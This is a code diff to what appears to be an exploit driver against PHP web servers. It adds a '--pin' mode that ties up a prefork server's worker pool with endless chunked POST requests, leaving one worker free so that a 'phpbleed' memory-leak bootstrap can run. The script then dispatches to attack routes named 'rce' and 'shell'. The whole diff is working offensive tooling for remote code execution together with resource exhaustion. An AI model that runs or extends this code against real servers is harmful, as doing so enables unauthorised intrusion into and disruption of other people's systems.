@@ -747,6 +747,10 @@ def main() -> int:
     ap.add_argument("--i-know-this-is-experimental", dest="experimental_ok",
                     action="store_true",
                     help="serializer: allow firing (route is unverified)")
+    ap.add_argument("--pin", action="store_true",
+                    help="dispatch: pin the prefork pool first (scripts/va_pin.py "
+                         "design - saturate all workers with unfinished chunked "
+                         "POSTs, free exactly one; verified on :8088 24-Oct)")
     a = ap.parse_args()
 
     # --- argument shape resolution (map.md binding):
@@ -786,12 +790,49 @@ def main() -> int:
     # dispatch route (default): leak-first bootstrap via the phpbleed module
     t = PB.Target(target, field=a.field)
     PB._CLASS = a.klass
-    PB.log(">", f"dispatch target :: http://{t.host}:{t.port}{t.path} "
-                f"(leak bootstrap: phpbleed module)")
-    fn = {"probe": route_dispatch_probe, "rce": route_dispatch_rce,
-          "id": route_dispatch_id, "shell": route_dispatch_shell,
-          "canary": route_dispatch_canary}[mode or "rce"]
-    return fn(t, a)
+    pin_state = {"pins": [], "stop": False}
+    if a.pin and a.route == "dispatch":
+        sys.path.insert(0, os.path.join(REPO, "scripts"))
+        import va_pin
+        import threading
+        u2 = urlparse(target if "://" in target else "http://" + target)
+        host2 = u2.hostname or "127.0.0.1"
+        PB.log(">", "pin: saturating prefork pool (va_pin design)")
+        pins, freed = va_pin.pin_and_free_one(host2, t.port, "/missing-probe-404")
+        if not freed:
+            PB.log("x", "pin: could not free exactly one worker; continuing unpinned")
+        else:
+            PB.log("+", f"pin: held={len(pins)}, exactly one worker free")
+            pin_state["pins"] = pins
+
+            def _maint():
+                while not pin_state["stop"]:
+                    time.sleep(1.0)
+                    for s in list(pin_state["pins"]):
+                        try:
+                            s.sendall(("%x\r\n" % va_pin.CHUNK).encode()
+                                      + b"A" * va_pin.CHUNK + b"\r\n")
+                        except OSError:
+                            try:
+                                s.close()
+                            except OSError:
+                                pass
+                            pin_state["pins"].remove(s)
+            threading.Thread(target=_maint, daemon=True).start()
+    try:
+        PB.log(">", f"dispatch target :: http://{t.host}:{t.port}{t.path} "
+                    f"(leak bootstrap: phpbleed module)")
+        fn = {"probe": route_dispatch_probe, "rce": route_dispatch_rce,
+              "id": route_dispatch_id, "shell": route_dispatch_shell,
+              "canary": route_dispatch_canary}[mode or "rce"]
+        return fn(t, a)
+    finally:
+        pin_state["stop"] = True
+        for s in pin_state["pins"]:
+            try:
+                s.close()
+            except OSError:
+                pass
 
 
 if __name__ == "__main__":
